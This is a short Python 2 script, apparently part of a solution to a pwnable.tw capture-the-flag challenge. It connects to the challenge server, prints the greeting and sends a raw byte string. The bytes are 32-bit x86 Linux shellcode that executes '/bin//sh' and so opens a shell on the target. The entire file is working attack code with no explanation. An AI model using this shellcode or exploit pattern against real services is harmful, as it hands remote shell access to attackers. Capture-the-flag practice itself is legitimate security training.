import socket

s = socket.socket()
s.connect(('chall.pwnable.tw', 10000))

recv = s.recv(2048)

if recv != None:
	print('[*] Server: ' + recv)
	s.send('\x31\xc0\x99\x50\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80')
